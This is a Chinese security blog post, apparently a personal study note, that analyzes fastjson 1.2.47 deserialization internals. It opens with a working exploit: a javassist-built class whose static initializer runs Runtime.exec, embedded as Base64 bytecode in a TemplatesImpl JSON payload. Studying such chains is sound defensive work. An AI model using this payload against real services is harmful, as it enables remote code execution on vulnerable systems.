@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>重拾fastjson分析领悟原理流程 | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-10-20T07:49:13.000Z" itemprop="datePublished">
+          2021-10-20
+      </time>
+    
+</span>
+                <h1>重拾fastjson分析领悟原理流程</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<p>因为之前分析过反序列化的一些点，之后有段时间没怎么看，现在重拾一下，并挖掘一个新的反序列化攻击链；</p>
+<p>这里拿着1.2.47的版本来进行分析一下走向；在进行序列化的时候会new一个SerializeWriter；然而在进行反序列化的时候则会去先初始化ParserConfig对象，以此获得基本的配置信息；具体的原理通过debug一下反序列化的过程不难发现；</p>
+<p>这里先来放下之前的一般的exp攻击代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));<span class="comment">//加入到路径中</span></span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        CtClass s2mple = classpool.get(s1mple.class.getName());<span class="comment">//拿到s1mple的class对象并将其写入到hashtable中；</span></span><br><span class="line">        CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());<span class="comment">//拿到AbstractTranslet的class对象并将其写入hashtalb中；</span></span><br><span class="line">        s2mple.setSuperclass(s3mple);<span class="comment">//设置父类；（过if）</span></span><br><span class="line">        s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line">        String base = Base64.getEncoder().encodeToString(bt);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">               String cc = <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;&#125;, &#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJQoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZzMW1wbGUBAAxJbm5lckNsYXNzZXMBABFMZmFzdGpzb24kczFtcGxlOwEAClNvdXJjZUZpbGUBAA1mYXN0anNvbi5qYXZhDAAEAAUHABMBAA9mYXN0anNvbiRzMW1wbGUBABBqYXZhL2xhbmcvT2JqZWN0AQAIZmFzdGpzb24BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAUCgAVAA8BAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAYAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGgAbCgAZABwBAD0vU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAeAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAIAAhCgAZACIBAA1TdGFja01hcFRhYmxlACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABgAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAkAAMAAgAAAA+nAAMBTLgAHRIftgAjV7EAAAABACQAAAADAAEDAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;: &#123;&#125;&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Object s1mple = JSON.parseObject(cc,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里其实原理也不是很难，就是利用fastjson没有配置相应的反序列化器的时候会去自己构造一个新的javabean反序列化器；以此利用javabean的一些特性去执行某些敏感的函数对于一些敏感属性进行赋值；然后在一些敏感函数中又会调用到一些敏感的函数比如newInstance之类；从而达到攻击的效果；这里分析过apache commonscollections的师傅不难发现我这里使用的就是apache commonscollections的一个利用点，并非是原链条；只是和commonscollections的第二个链条的触发方式一样，都是利用自己设置的恶意类，然后去TemplatesImpl类下经过newInstance函数触发执行static模块的内容；本篇文章拿着这个利用点进行一些分析和追溯，再次深入理解fastjson的各个功能点；</p>
+<p><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
+<p>这里我是开启了type的功能；其实是否开启对于缓存的攻击方式都无所谓；FastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用addBaseClassMappings和loadClass函数将一些基础类和第三方库存放到mappings中；因为是写入缓存mapping中；当type功能没开启的时候，会从mappings或deserializers.findClass函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/5TZ5hd"><img src="https://z3.ax1x.com/2021/10/26/5TZ5hd.png" alt="5TZ5hd.png"></a></p>
+<p>这边直接来追溯一下看到调用了parseObject的时候会去利用重载去拿到ParserConfig的实力化对象；这边追溯不难发现，ParserConfig中有个static模块；在调用的时候会优先执行；分析一下不难发现ParserConfig.global是ParserConfig的实例化对象；这就是在反序列化的时候会先去运载基础配置文件ParserConfig；ParserConfig文件中放入了很多默认写好的配置，比如内部注册的反序列化，还有内置的一些黑名单等等；至于原因自然是有一方面是为了提升相应的解析速度和一些相应的安全防范；</p>
+<p>这边利用重载去到了209行下的parseObject方法；大致来看基本的步骤是三个；</p>
+<ol>
+<li>配置反序列化时启用的特性，比如是否允许反序列化非公有字段和相应反序列化类型的反序列化器；</li>
+<li>获取一个json的词法分析对象parser</li>
+<li>用parser分析传入进来的json字符串，进行反序列化。</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEEcD"><img src="https://z3.ax1x.com/2021/11/08/IJEEcD.png" alt="IJEEcD.png"></a></p>
+<p>这边可明显的看到带着基础配置类的实例化对象进入了后续的函数；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEk9K"><img src="https://z3.ax1x.com/2021/11/08/IJEk9K.png" alt="IJEk9K.png"></a></p>
+<p>利用for循环，来配置反序列化启用的特征；这点也是我们最开始传入的feature；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJENHs"><img src="https://z3.ax1x.com/2021/11/08/IJENHs.png" alt="IJENHs.png"></a></p>
+<p>第二大步：</p>
+<p>拿到一个分析json词法的分析器parser；（对象）</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEA1O"><img src="https://z3.ax1x.com/2021/11/08/IJEA1O.png" alt="IJEA1O.png"></a></p>
+<p>这边来细致的走一波DefaultJSONParser这个class的实例化过程；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEenH"><img src="https://z3.ax1x.com/2021/11/08/IJEenH.png" alt="IJEenH.png"></a></p>
+<p>先来执行类的静态模块，这里加入了一些基本的对象；包括String、double、Short、Integer等；将其放入primitiveClasses中；用于以后的判断类型是否属于基础类型来使用；</p>
+<p><img src="https://i.loli.net/2021/11/08/6x4EIUjpuimkZHJ.png" alt="截屏2021-10-28 下午12.17.28.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt;[] classes = <span class="keyword">new</span> Class[]&#123;Boolean.TYPE, Byte.TYPE, Short.TYPE, Integer.TYPE, Long.TYPE, Float.TYPE, Double.TYPE, Boolean.class, Byte.class, Short.class, Integer.class, Long.class, Float.class, Double.class, BigInteger.class, BigDecimal.class, String.class&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>执行完静态模块之后就开始去执行类的初始化方法，利用构造器的重载去new一个json的扫描器；JSONScanner类的生成同样先是执行类初始化</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEmBd"><img src="https://z3.ax1x.com/2021/11/08/IJEmBd.png" alt="IJEmBd.png"></a></p>
+<p>执行JSONScanner类的初始化的时候会去实例化其父类然后和其本身的初始化；相关代码如下所示；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEnHA"><img src="https://z3.ax1x.com/2021/11/08/IJEnHA.png" alt="IJEnHA.png"></a></p>
+<p>这里的if判断句是为了移除bom头；相关的原因和解释如下链接：</p>
+<p><code>https://www.cnblogs.com/silentjesse/p/3919127.html</code></p>
+<p>经过这一系列的操作之后，最后回到DefaultJSONParser方法；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEMNt"><img src="https://z3.ax1x.com/2021/11/08/IJEMNt.png" alt="IJEMNt.png"></a></p>
+<p>这里因为是<code>&#123;</code>开头，所以token赋值为12；随着词法分析进行token进行会一直改变，token不一样意味着解析接下来json的策略也会变。token与字符的关联关系定义在com.alibaba.fastjson.parser.JSONToken；这里显然在读取<code>&#123;</code>之后，将token设置为12，然后向后读取一位设置ch，读取到<code>&quot;</code>;</p>
+<p>为了方便在报错的时候直接用token抛出相应字段的错误；</p>
+<p>贴上源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.parser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSONToken</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ERROR = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LITERAL_INT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LITERAL_FLOAT = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LITERAL_STRING = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LITERAL_ISO8601_DATE = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TRUE = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FALSE = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NULL = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NEW = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LPAREN = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RPAREN = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LBRACE = <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RBRACE = <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> LBRACKET = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RBRACKET = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COMMA = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COLON = <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> IDENTIFIER = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FIELD_NAME = <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> EOF = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SET = <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREE_SET = <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UNDEFINED = <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SEMI = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DOT = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEX = <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JSONToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">name</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(value) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;int&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;float&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;string&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;iso8601&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;new&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;,&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;:&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ident&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;fieldName&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;EOF&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Set&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;TreeSet&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;undefined&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;;&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hex&quot;</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不是很难理解，词法分析器主要是JSONScanner对象，只从名字上来看，这个对象就是json的扫描器，既然是扫描器，那么自然就是词法解析的主要对象；</p>
+<p>三、开始对json数据进行解析：</p>
+<p>前面这些基本的config设置和扫描器实例化完成之后就是调用json的词法解析器，对json的数据进行解析了；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEKAI"><img src="https://z3.ax1x.com/2021/11/08/IJEKAI.png" alt="IJEKAI.png"></a></p>
+<p>开始解析的时候会先到ParserConfig类下通过getDeserializer函数拿到相应的json解析器；这里也就是关联到我之前说的ParserConfig基础配置类，里面写有相应的内部注册的反序列化机制，规定某种类型用什么解析器去进行相应的解析，为的是加快解析的速度；用已经写好的解析器直接解析；根据传入的类类型的不同，config会返回不同的反序列化器。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEaEn"><img src="https://z3.ax1x.com/2021/11/08/IJEaEn.png" alt="IJEaEn.png"></a></p>
+<p>这里的type就是在最开始我们传入的Object.class；</p>
